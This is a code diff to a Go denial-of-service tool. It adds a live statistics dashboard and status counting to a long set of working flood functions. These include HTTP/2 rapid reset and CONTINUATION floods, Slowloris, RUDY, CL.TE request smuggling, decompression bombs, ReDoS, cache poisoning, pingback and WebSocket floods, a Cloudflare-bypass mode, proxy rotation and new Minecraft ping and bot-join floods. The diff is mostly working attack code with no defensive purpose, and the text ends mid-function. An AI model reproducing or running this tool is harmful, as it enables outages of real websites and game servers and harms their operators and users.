@@ -15,8 +15,11 @@ import (
     "net/http"
     "net/url"
     "os"
+    "os/exec"
+    "runtime"
     "strconv"
     "strings"
+    "sync"
     "sync/atomic"
     "time"
 
@@ -40,10 +43,11 @@ var defaultUserAgents = []string{
 
 var userAgents []string
 var totalSent atomic.Int64
-var totalErrors atomic.Int64
-var totalNonSucc atomic.Int64
 var proxyList []string
 var zstdBombPayload []byte
+var startTime time.Time
+var statusCounts = make(map[string]int)
+var statusMutex = sync.Mutex{}
 
 func init() {
     if uas, err := loadUserAgents("useragent.txt"); err == nil && len(uas) > 0 {
@@ -58,6 +62,8 @@ func init() {
     gz.Write(payload)
     gz.Close()
     zstdBombPayload = buf.Bytes()
+
+    startTime = time.Now()
 }
 
 func loadUserAgents(filename string) ([]string, error) {
@@ -108,6 +114,160 @@ func loadProxies(filename string) ([]string, error) {
         return nil, fmt.Errorf("no proxies found in %s", filename)
     }
     return lines, nil
+}
+
+func recordStatus(code string) {
+    statusMutex.Lock()
+    statusCounts[code]++
+    statusMutex.Unlock()
+}
+
+func getSysInfo() map[string]string {
+    info := make(map[string]string)
+    info["OS"] = runtime.GOOS + " " + runtime.GOARCH
+    info["CPU"] = fmt.Sprintf("%d cores", runtime.NumCPU())
+
+    if runtime.GOOS == "linux" {
+        if b, err := os.ReadFile("/etc/os-release"); err == nil {
+            for _, line := range strings.Split(string(b), "\n") {
+                if strings.HasPrefix(line, "PRETTY_NAME=") {
+                    info["OS"] = strings.Trim(strings.Split(line, "=")[1], `"`)
+                    break
+                }
+            }
+        }
+        if b, err := os.ReadFile("/proc/sys/kernel/osrelease"); err == nil {
+            info["Kernel"] = strings.TrimSpace(string(b))
+        }
+        if b, err := os.ReadFile("/proc/meminfo"); err == nil {
+            lines := strings.Split(string(b), "\n")
+            if len(lines) > 0 {
+                info["Memory"] = strings.TrimSpace(lines[0])
+            }
+        }
+        if out, err := exec.Command("uname", "-n").Output(); err == nil {
+            info["Host"] = strings.TrimSpace(string(out))
+        } else {
+            info["Host"] = "Local-Machine"
+        }
+    } else {
+        info["Host"] = "Local-Machine"
+        info["Kernel"] = "N/A"
+        info["Memory"] = "N/A"
+    }
+
+    info["Uptime"] = time.Since(startTime).Round(time.Second).String()
+    return info
+}
+
+func drawUI(target, method, proxyFile string, workers, duration int) {
+    sysInfo := getSysInfo()
+    sent := totalSent.Load()
+    elapsed := time.Since(startTime).Seconds()
+    if elapsed < 1 {
+        elapsed = 1
+    }
+    rps := float64(sent) / elapsed
+
+    fmt.Print("\033[H\033[2J")
+
+    logo := []string{
+        "      _,met$$$$$gg.          ",
+        "    ,g$$$$$$$$$$$$$$$P.       ",
+        "  ,g$$P\"     \"\"\"Y$$.\".        ",
+        " ,$$P'              `$$$.     ",
+        "',$$P       ,ggs.     `$$b:   ",
+        "`d$$'     ,$P\"'   .    $$$    ",
+        " $$P      d$'     ,    $$P    ",
+        " $$:      $$.   -    ,d$$'    ",
+        " $$;      Y$b._   _,d$P'      ",
+        " Y$$.    `.`\"Y$$$$P\"'         ",
+        " `$$b      \"-.__              ",
+        "  `Y$$                        ",
+        "   `Y$$.                      ",
+        "     `$$b.                    ",
+        "       `Y$$b.                 ",
+        "          `\"Y$b._             ",
+        "              `\"\"\"            ",
+    }
+
+    cReset := "\033[0m"
+    cRed := "\033[31m"
+    cGreen := "\033[32m"
+    cYellow := "\033[33m"
+    cCyan := "\033[36m"
+    cMagenta := "\033[35m"
+    cBold := "\033[1m"
+    cDim := "\033[2m"
+
+    proxyLabel := "DIRECT"
+    if proxyFile != "" {
+        proxyLabel = proxyFile
+    }
+
+    infoLines := []string{
+        cBold + cGreen + sysInfo["Host"] + cReset,
+        cDim + "---------------------------" + cReset,
+        cBold + "OS: " + cReset + sysInfo["OS"],
+        cBold + "Host: " + cReset + sysInfo["Host"],
+        cBold + "Kernel: " + cReset + sysInfo["Kernel"],
+        cBold + "Uptime: " + cReset + sysInfo["Uptime"],
+        cBold + "CPU: " + cReset + sysInfo["CPU"],
+        cBold + "Memory: " + cReset + sysInfo["Memory"],
+        cDim + "---------------------------" + cReset,
+        cBold + cRed + "TARGET: " + cReset + target,
+        cBold + cMagenta + "METHOD: " + cReset + strings.ToUpper(method),
+        cBold + cYellow + "WORKERS: " + cReset + strconv.Itoa(workers),
+        cBold + cCyan + "PROXIES: " + cReset + proxyLabel,
+        cDim + "---------------------------" + cReset,
+        cBold + cGreen + "SENT: " + cReset + strconv.FormatInt(sent, 10),
+        cBold + cCyan + "RPS: " + cReset + fmt.Sprintf("%.0f", rps),
+        cDim + "---------------------------" + cReset,
+        cBold + "STATUS CODES:" + cReset,
+    }
+
+    statusMutex.Lock()
+    keys := make([]string, 0, len(statusCounts))
+    for k := range statusCounts {
+        keys = append(keys, k)
+    }
+    for i := 0; i < len(keys); i++ {
+        for j := i + 1; j < len(keys); j++ {
+            if keys[i] > keys[j] {
+                keys[i], keys[j] = keys[j], keys[i]
+            }
+        }
+    }
+
+    for _, k := range keys {
+        color := cGreen
+        if k == "Err" || strings.HasPrefix(k, "4") || strings.HasPrefix(k, "5") {
+            color = cRed
+        } else if strings.HasPrefix(k, "3") {
+            color = cYellow
+        }
+        infoLines = append(infoLines, color+k+cReset+": "+strconv.Itoa(statusCounts[k]))
+    }
+    statusMutex.Unlock()
+
+    maxLines := len(logo)
+    if len(infoLines) > maxLines {
+        maxLines = len(infoLines)
+    }
+
+    for i := 0; i < maxLines; i++ {
+        var l string
+        if i < len(logo) {
+            l += cRed + logo[i] + cReset
+        } else {
+            l += strings.Repeat(" ", 28)
+        }
+        if i < len(infoLines) {
+            l += "  " + infoLines[i]
+        }
+        fmt.Println(l)
+    }
+    fmt.Println()
 }
 
 const (
@@ -168,7 +328,6 @@ func buildClientPool(proxies []string, workers int) ([]*http.Client, error) {
     for _, raw := range unique {
         proxyURL, err := url.Parse(raw)
         if err != nil {
-            log.Printf("skipping bad proxy %s: %v", raw, err)
             continue
         }
         for i := 0; i < clientsPerProxy; i++ {
@@ -209,19 +368,6 @@ func buildDirectPool(count int) []*http.Client {
     return clients
 }
 
-func httpGet(url string, client *http.Client) error {
-    resp, err := client.Get(url)
-    if err != nil {
-        return err
-    }
-    io.Copy(io.Discard, resp.Body)
-    resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
-    return nil
-}
-
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
 func randString(n int) string {
@@ -235,6 +381,18 @@ func randString(n int) string {
 func randEmail() string {
     domains := []string{"gmail.com", "yahoo.com", "outlook.com", "proton.me", "mail.ru", "example.com"}
     return randString(8+rand.Intn(12)) + "@" + domains[rand.Intn(len(domains))]
+}
+
+func httpGet(url string, client *http.Client) error {
+    resp, err := client.Get(url)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    return nil
 }
 
 func genFormPayload() (string, string) {
@@ -294,6 +452,7 @@ func httpPost(targetURL string, client *http.Client) error {
     body, contentType := genFormPayload()
     req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", contentType)
@@ -303,13 +462,12 @@ func httpPost(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -347,6 +505,7 @@ func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error
 
     req, err := http.NewRequest("POST", targetURL, slow)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.ContentLength = int64(declaredSize)
@@ -366,16 +525,19 @@ func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error
 
     resp, err := rudyClient.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpRapidReset(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
+        recordStatus("Err")
         return err
     }
 
@@ -395,10 +557,12 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
         proxy := proxyList[rand.Intn(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
 
@@ -413,6 +577,7 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
 
         if _, err := rawConn.Write([]byte(connectReq)); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
 
@@ -420,16 +585,19 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
         resp, err := http.ReadResponse(br, nil)
         if err != nil {
             rawConn.Close()
-            return fmt.Errorf("CONNECT failed: %w", err)
+            recordStatus("Err")
+            return err
         }
         resp.Body.Close()
         if resp.StatusCode != 200 {
             rawConn.Close()
-            return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+            recordStatus("ProxyErr")
+            return err
         }
     } else {
         rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -441,15 +609,18 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
     })
     if err := tlsConn.Handshake(); err != nil {
         rawConn.Close()
+        recordStatus("Err")
         return err
     }
     defer tlsConn.Close()
 
     if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+        recordStatus("Err")
         return fmt.Errorf("h2 not negotiated")
     }
 
     if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+        recordStatus("Err")
         return err
     }
 
@@ -504,6 +675,7 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
         case <-stop:
             return nil
         case <-connDone:
+            recordStatus("Err")
             return fmt.Errorf("connection closed by server")
         default:
         }
@@ -522,14 +694,16 @@ func httpRapidReset(targetURL string, stop <-chan struct{}) error {
                 EndStream:     true,
                 EndHeaders:    true,
             }); err != nil {
+                recordStatus("Err")
                 return err
             }
 
             if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+                recordStatus("Err")
                 return err
             }
 
-            totalSent.Add(1)
+            recordStatus("RST")
             streamID += 2
 
             if streamID >= 1<<31-1 {
@@ -557,6 +731,7 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
         var err error
         proxyURL, err = url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -579,6 +754,7 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
 
     conn, _, err := dialer.Dial(wsURL, headers)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     defer conn.Close()
@@ -620,14 +796,15 @@ func wsFlood(targetURL string, stop <-chan struct{}) error {
                     err = e
                     break
                 }
-                totalSent.Add(1)
+                recordStatus("Sent")
             }
         }
 
         if err != nil {
+            recordStatus("Err")
             return err
         }
-        totalSent.Add(1)
+        recordStatus("Sent")
     }
 }
 
@@ -710,6 +887,7 @@ func httpAPIFlood(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", "application/json")
@@ -722,19 +900,19 @@ func httpAPIFlood(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpSlowloris(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     host := u.Hostname()
@@ -753,31 +931,37 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
         proxy := proxyList[rand.Intn(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
         if _, err := rawConn.Write([]byte(connectReq)); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         br := bufio.NewReader(rawConn)
         resp, err := http.ReadResponse(br, nil)
         if err != nil {
             rawConn.Close()
-            return fmt.Errorf("CONNECT failed: %w", err)
+            recordStatus("Err")
+            return err
         }
         resp.Body.Close()
         if resp.StatusCode != 200 {
             rawConn.Close()
-            return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+            recordStatus("ProxyErr")
+            return err
         }
     } else {
         rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -787,6 +971,7 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
         tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
         if err := tlsConn.Handshake(); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         conn = tlsConn
@@ -805,8 +990,10 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
         case <-ticker.C:
             _, err := fmt.Fprintf(conn, "X-%s: %s\r\n", randString(5), randString(10))
             if err != nil {
+                recordStatus("Err")
                 return err
             }
+            recordStatus("Held")
         }
     }
 }
@@ -814,6 +1001,7 @@ func httpSlowloris(targetURL string, stop <-chan struct{}) error {
 func httpHeaderFlood(targetURL string, client *http.Client) error {
     req, err := http.NewRequest("GET", targetURL, nil)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("User-Agent", randUA())
@@ -825,13 +1013,12 @@ func httpHeaderFlood(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -855,6 +1042,7 @@ func httpMixPost(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", contentType)
@@ -864,13 +1052,12 @@ func httpMixPost(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -883,6 +1070,7 @@ func httpCFBypass(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("User-Agent", randUA())
@@ -899,19 +1087,19 @@ func httpCFBypass(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpRangeAttack(targetURL string, client *http.Client) error {
     req, err := http.NewRequest("GET", targetURL, nil)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("User-Agent", randUA())
@@ -924,19 +1112,19 @@ func httpRangeAttack(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpCookieBomb(targetURL string, client *http.Client) error {
     req, err := http.NewRequest("GET", targetURL, nil)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("User-Agent", randUA())
@@ -953,13 +1141,12 @@ func httpCookieBomb(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -981,6 +1168,7 @@ func httpChunkPost(targetURL string, client *http.Client, stop <-chan struct{}) 
     body := io.NopCloser(&chunkDripReader{stop: stop})
     req, err := http.NewRequest("POST", targetURL, body)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.ContentLength = -1
@@ -998,16 +1186,19 @@ func httpChunkPost(targetURL string, client *http.Client, stop <-chan struct{}) 
 
     resp, err := cClient.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpMalformed(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     host := u.Hostname()
@@ -1026,31 +1217,37 @@ func httpMalformed(targetURL string, stop <-chan struct{}) error {
         proxy := proxyList[rand.Intn(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
         if _, err := rawConn.Write([]byte(connectReq)); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         br := bufio.NewReader(rawConn)
         resp, err := http.ReadResponse(br, nil)
         if err != nil {
             rawConn.Close()
-            return fmt.Errorf("CONNECT failed: %w", err)
+            recordStatus("Err")
+            return err
         }
         resp.Body.Close()
         if resp.StatusCode != 200 {
             rawConn.Close()
-            return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+            recordStatus("ProxyErr")
+            return err
         }
     } else {
         rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -1060,6 +1257,7 @@ func httpMalformed(targetURL string, stop <-chan struct{}) error {
         tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
         if err := tlsConn.Handshake(); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         conn = tlsConn
@@ -1070,14 +1268,17 @@ func httpMalformed(targetURL string, stop <-chan struct{}) error {
     _, err = conn.Write([]byte(payload))
     conn.Close()
     if err != nil {
+        recordStatus("Err")
         return err
     }
+    recordStatus("Sent")
     return nil
 }
 
 func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     host := u.Hostname()
@@ -1096,31 +1297,37 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
         proxy := proxyList[rand.Intn(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
         if _, err := rawConn.Write([]byte(connectReq)); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         br := bufio.NewReader(rawConn)
         resp, err := http.ReadResponse(br, nil)
         if err != nil {
             rawConn.Close()
-            return fmt.Errorf("CONNECT failed: %w", err)
+            recordStatus("Err")
+            return err
         }
         resp.Body.Close()
         if resp.StatusCode != 200 {
             rawConn.Close()
-            return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+            recordStatus("ProxyErr")
+            return err
         }
     } else {
         rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -1132,15 +1339,18 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
     })
     if err := tlsConn.Handshake(); err != nil {
         rawConn.Close()
+        recordStatus("Err")
         return err
     }
     defer tlsConn.Close()
 
     if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+        recordStatus("Err")
         return fmt.Errorf("h2 not negotiated")
     }
 
     if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+        recordStatus("Err")
         return err
     }
 
@@ -1197,6 +1407,7 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
         case <-stop:
             return nil
         case <-connDone:
+            recordStatus("Err")
             return fmt.Errorf("connection closed by server")
         default:
         }
@@ -1214,17 +1425,19 @@ func httpH2Continuation(targetURL string, stop <-chan struct{}) error {
             EndStream:     false,
             EndHeaders:    false,
         }); err != nil {
+            recordStatus("Err")
             return err
         }
 
         for i := 0; i < 100; i++ {
             if err := framer.WriteContinuation(streamID, false, junkHeaders); err != nil {
+                recordStatus("Err")
                 return err
             }
         }
         bw.Flush()
 
-        totalSent.Add(1)
+        recordStatus("Sent")
         streamID += 2
 
         if streamID >= 1<<31-1 {
@@ -1249,6 +1462,7 @@ func httpGraphQLBatch(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", "application/json")
@@ -1257,19 +1471,19 @@ func httpGraphQLBatch(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpZstdBomb(targetURL string, client *http.Client) error {
     req, err := http.NewRequest("POST", targetURL, bytes.NewReader(zstdBombPayload))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", "application/octet-stream")
@@ -1279,13 +1493,12 @@ func httpZstdBomb(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -1294,6 +1507,7 @@ func httpReDoS(targetURL string, client *http.Client) error {
     body := fmt.Sprintf(`{"email":"%s@example.com","username":"%s"}`, redosPayload, redosPayload)
     req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", "application/json")
@@ -1301,13 +1515,12 @@ func httpReDoS(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
@@ -1320,6 +1533,7 @@ func httpCachePoison(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("GET", fullURL, nil)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("User-Agent", randUA())
@@ -1327,19 +1541,19 @@ func httpCachePoison(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
-    }
+    recordStatus(strconv.Itoa(resp.StatusCode))
     return nil
 }
 
 func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
     u, err := url.Parse(targetURL)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     host := u.Hostname()
@@ -1358,31 +1572,37 @@ func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
         proxy := proxyList[rand.Intn(len(proxyList))]
         pURL, err := url.Parse(proxy)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
         connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n\r\n"
         if _, err := rawConn.Write([]byte(connectReq)); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         br := bufio.NewReader(rawConn)
         resp, err := http.ReadResponse(br, nil)
         if err != nil {
             rawConn.Close()
-            return fmt.Errorf("CONNECT failed: %w", err)
+            recordStatus("Err")
+            return err
         }
         resp.Body.Close()
         if resp.StatusCode != 200 {
             rawConn.Close()
-            return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+            recordStatus("ProxyErr")
+            return err
         }
     } else {
         rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
         if err != nil {
+            recordStatus("Err")
             return err
         }
     }
@@ -1392,6 +1612,7 @@ func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
         tlsConn := tls.Client(rawConn, &tls.Config{ServerName: host, InsecureSkipVerify: true})
         if err := tlsConn.Handshake(); err != nil {
             rawConn.Close()
+            recordStatus("Err")
             return err
         }
         conn = tlsConn
@@ -1402,8 +1623,10 @@ func httpSmuggleCLTE(targetURL string, stop <-chan struct{}) error {
     payload := fmt.Sprintf("POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\nUser-Agent: %s\r\n\r\n0\r\n\r\nGET %s HTTP/1.1\r\nHost: %s\r\n\r\n", host, randUA(), smuggledPath, host)
     _, err = conn.Write([]byte(payload))
     if err != nil {
+        recordStatus("Err")
         return err
     }
+    recordStatus("Sent")
     return nil
 }
 
@@ -1413,6 +1636,7 @@ func httpPingback(targetURL string, client *http.Client) error {
 
     req, err := http.NewRequest("POST", fullURL, strings.NewReader(body))
     if err != nil {
+        recordStatus("Err")
         return err
     }
     req.Header.Set("Content-Type", "text/xml")
@@ -1420,13 +1644,117 @@ func httpPingback(targetURL string, client *http.Client) error {
 
     resp, err := client.Do(req)
     if err != nil {
+        recordStatus("Err")
         return err
     }
     io.Copy(io.Discard, resp.Body)
     resp.Body.Close()
-    if resp.StatusCode < 200 || resp.StatusCode >= 300 {
-        totalNonSucc.Add(1)
+    recordStatus(strconv.Itoa(resp.StatusCode))
+    return nil
+}
+
+func mcPingFlood(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
     }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    hostLen := len(host)
+    handshake := []byte{0x00, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, byte(hostLen)}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x01)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    reqPacket := []byte{0x01, 0x00}
+
+    _, err = conn.Write(packet)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    _, err = conn.Write(reqPacket)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+
+    buf := make([]byte, 4096)
+    conn.SetReadDeadline(time.Now().Add(2 * time.Second))
+    conn.Read(buf)
+
+    recordStatus("Sent")
+    return nil
+}
+
+func mcBotJoin(targetURL string, stop <-chan struct{}) error {
+    u, err := url.Parse(targetURL)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    host := u.Hostname()
+    port := u.Port()
+    if port == "" {
+        port = "25565"
+    }
+    addr := net.JoinHostPort(host, port)
+
+    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
+    if err != nil {
+        recordStatus("Err")
+        return err
+    }
+    defer conn.Close()
+
+    hostLen := len(host)
+    handshake := []byte{0x00, 0x2F, 0x00, byte(hostLen)}
+    handshake = append(handshake, []byte(host)...)
+    portInt, _ := strconv.Atoi(port)
+    portBytes := []byte{byte(portInt >> 8), byte(portInt)}
+    handshake = append(handshake, portBytes...)
+    handshake = append(handshake, 0x02)
+
+    pktLen := len(handshake)
+    packet := []byte{byte(pktLen)}
+    packet = append(packet, handshake...)
+
+    username := randString(16)
+    nameLen := len(username)
+    loginStart := []byte{0x00, byte(nameLen)}
+    loginStart = append(loginStart, []byte(username)...)
+
+    reqLen := len(loginStart)
